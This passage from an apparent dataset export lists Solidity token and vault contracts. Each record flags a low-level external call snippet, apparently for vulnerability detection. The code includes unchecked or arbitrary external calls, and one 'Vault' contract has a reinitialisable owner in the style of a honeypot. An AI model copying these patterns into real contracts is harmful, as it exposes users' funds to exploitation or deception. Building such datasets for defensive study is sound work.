allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function totalSupply() constant returns (uint totalSupply){\n return _totalSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public _totalSupply;\n}\ncontract EqualToken is StandardToken {\n function () {\n revert();\n }\n string public name;\n string public symbol;\n string public version = 'H1.0';\n string public feeInfo = \"Each operation costs 1% of the transaction amount, but not more than 250 tokens.\";\n function EqualToken() {\n _totalSupply = 800000000000000000000000000;\n balances[msg.sender] =_totalSupply;\n allocate(0x1c1bE8B53Bd8b7Dc9d0CE46C335532A43b414372,55);\n allocate(0x55819E6F3C4E72ed63c7C465d4FA6C4dd7681cA9,20);\n allocate(0x92Ab7CaB1fD2a4581350a94Acf0e5594319db6Ee,20);\n allocate(0xE165aadFD17CfF20357A301785B968b4FeB9B8b7,5);\n maxFee=250;\n name = \"Equal Token\";\n decimals = 18;\n symbol = \"EQL\";\n }\n function allocate(address _address,uint256 percent) private{\n uint256 bal=_totalSupply.onePercent().mul(percent);\n withoutFee[_address]=true;\n doTransfer(msg.sender,_address,bal,0);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14fc"
  },
  "filename": "33420.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract AngryToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function AngryToken(\n ) {\n balances[msg.sender] = 200000000000000000000000000;\n totalSupply = 200000000000000000000000000;\n name = \"AngryToken\";\n decimals = 18;\n symbol = \"ANG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14fd"
  },
  "filename": "33421.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 2100000000000000;\n totalSupply = 210000000000000000;\n name = \"MEESH coin\";\n decimals = 8;\n symbol = \"MEESH\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14fe"
  },
  "filename": "33423.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Ventura is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Ventura(\n ) {\n balances[msg.sender] = 200000000;\n totalSupply = 200000000;\n name = \"Ventura\";\n decimals = 18;\n symbol = \"VENT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14ff"
  },
  "filename": "33464.sol",
  "content": "pragma solidity ^0.4.14;\ncontract Ownable {\n address Owner = msg.sender;\n modifier onlyOwner { if (msg.sender == Owner) _; }\n function transferOwnership(address to) public onlyOwner { Owner = to; }\n}\ncontract TokenVault is Ownable {\n function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {\n return token.call(bytes4(0xa9059cbb), to, amount);\n }\n}\ncontract Vault is TokenVault {\n event Deposit(address indexed depositor, uint amount);\n event Withdrawal(address indexed to, uint amount);\n event OpenDate(uint date);\n mapping (address => uint) public Deposits;\n uint minDeposit;\n bool Locked;\n uint Date;\n function init() payable open {\n Owner = msg.sender;\n minDeposit = 0.5 ether;\n Locked = false;\n deposit();\n }\n function MinimumDeposit() public constant returns (uint) { return minDeposit; }\n function ReleaseDate() public constant returns (uint) { return Date; }\n function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }\n function() public payable { deposit(); }\n function deposit() public payable {\n if (msg.value > 0) {\n if (msg.value >= MinimumDeposit())\n Deposits[msg.sender] += msg.value;\n Deposit(msg.sender, msg.value);\n }\n }\n function setRelease(uint newDate) public {\n Date = newDate;\n OpenDate(Date);\n }\n function withdraw(address to, uint amount) public onlyOwner {\n if (WithdrawEnabled()) {\n uint max = Deposits[msg.sender];\n if (max > 0 && amount <= max) {\n to.transfer(amount);\n Withdrawal(to, amount);\n }\n }\n }\n function lock() public { Locked = true; } address owner;\n modifier open { if (!Locked) _; owner = msg.sender; }\n function kill() public { require(this.balance == 0); selfdestruct(Owner); }\n function getOwner() external constant returns (address) { return owner; }\n}",
  "extract_feature": [
    "function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {\nreturn token.call(bytes4(0xa9059cbb), to, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1500"
  },
  "filename": "33474.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1501"
  },
  "filename": "33483.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function burn(uint256 _value) public returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed from, uint256 value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function burn(uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n Burn(msg.sender, _value);\n return true;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\ncontract SafeCrypt is HumanStandardToken(1535714285000000000000000000, \"SafeCrypt\", 18, \"SFC\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1502"
  },
  "filename": "33488.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function burn(uint256 _value) public returns (bool success) {}\n function burnFrom(address _from, uint256 _value) public returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed from, uint256 value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function burn(uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n Burn(msg.sender, _value);\n return true;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\ncontract SuperGopnikToken is HumanStandardToken(10000000000000000000000000, \"SuperGopnikToken\", 18, \"SGT\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1503"
  },
  "filename": "33496.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MexicanDigitalPeso is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MexicanDigitalPeso(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"Mexican Digital Peso\";\n decimals = 2;\n symbol = \"MXO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1504"
  },
  "filename": "33513.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n uint256 public totalSupply = 100000000;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Bittle is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is Bittle {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals = 18;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount ,\n string _tokenName ,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1505"
  },
  "filename": "33520.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract WeberToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function WeberToken(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"Webercoin\";\n decimals = 0;\n symbol = \"WBC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1506"
  },
  "filename": "33527.sol",
  "content": "pragma solidity ^0.4.6;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HEStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public 